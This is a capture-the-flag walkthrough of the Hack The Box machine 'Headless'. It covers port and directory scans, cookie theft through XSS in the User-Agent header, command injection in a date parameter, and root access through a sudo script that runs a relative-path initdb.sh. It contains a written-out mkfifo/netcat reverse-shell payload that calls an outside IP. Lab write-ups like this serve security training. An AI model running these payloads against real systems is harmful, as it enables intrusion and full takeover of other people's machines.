---
description: https://app.hackthebox.com/machines/Headless/
---

# Headless

![image](https://gist.github.com/assets/56447720/2ea1270f-3a60-40b8-86bf-104143ad87a2)

## Port Scan

```bash

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXBmWeZYo1LR50JTs8iKyICHT76i7+fBPoeiKDXRhzjsfMWruwHrosHoSwRxiqUdaJYLwJgWOv+jFAB45nRQHw=
|   256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkBEMKoic0Bx5yLYG4DIT5G797lraNQsG5dtyZUl9nW
5000/tcp open  upnp?   syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 24 Mar 2024 03:39:26 GMT
|     Content-Type: text/html; charset=utf-8
|
| << -- SNIPPED -- >>

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Dir scan

```bash

└─➜ ffuf -u http://10.129.131.122:5000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | tee dir.scan                                                                [0]

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.131.122:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 813ms]
    * FUZZ: dashboard

[WARN] Caught keyboard interrupt (Ctrl-C)

```

## User

![image](https://gist.github.com/assets/56447720/f72a650c-a965-4fee-9df8-931cf73f3778)

### XSS on User Agent

I tried fuzzing payloads on the support page, but no luck. So I moved with HTTP headers, since the machine name also gave hint on headers.

![image](https://gist.github.com/assets/56447720/2eedfe97-9def-4a45-b219-b410f59b19e6)

After few seconds, we get Admin cookie on our python server

![image](https://gist.github.com/assets/56447720/2b0f61e4-b8e0-47b5-8cdb-fe92eb385686)

Let's head to `/dashboard` with admin.

![image](https://gist.github.com/assets/56447720/b67d41b7-038b-4f18-9caa-f09d6cc784bd)

### Cmd injection

On the date parameter, I noticed Command Injection. Payload : `date=2023-09-15%3bsleep+3`. Got response 3 seconds later.

* For user I used following payload:

```js
POST /dashboard HTTP/1.1
<SNIP>

date=2023-09-15%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.16.8+4443+>/tmp/f
```

* And now we got user flag

```bash
dvir@headless:~/app$ id
id
uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)
dvir@headless:~/app$
```

## Root

Root on this machine was toooooo easy

```bash
dvir@headless:~$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
dvir@headless:~$ sudo /usr/bin/syscheck
```

syscheck was a BASH script.

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0

```

After reading it, we can find the vulnerability within seconds.

```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```

It's using the initdb.sh file from current directory, we just need to make a script called `initdb.sh` and put `/bin/bash` in it.

```bash
dvir@headless:~$ pwd
pwd
/home/dvir
dvir@headless:~$ cat initdb.sh
cat initdb.sh
/bin/bash

```

* After running the script as sudo we get the root shell

```bash
dvir@headless:~$ sudo  /usr/bin/syscheck
sudo  /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.06, 0.02, 0.00
Database service is not running. Starting it...
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c "import pty;pty.spawn('/bin/bash')"
root@headless:/home/dvir# echo 'echo 'PWNEDDDDDDDDDDDD AS ROOOOOOT'
echo 'PWNEDDDDDDDDDDDD AS ROOOOOOT'
PWNEDDDDDDDDDDDD AS ROOOOOOT
root@headless:/home/dvir#
```

\_\_\_\_\_\_\_\_\_\_heapbytes's still pwning.
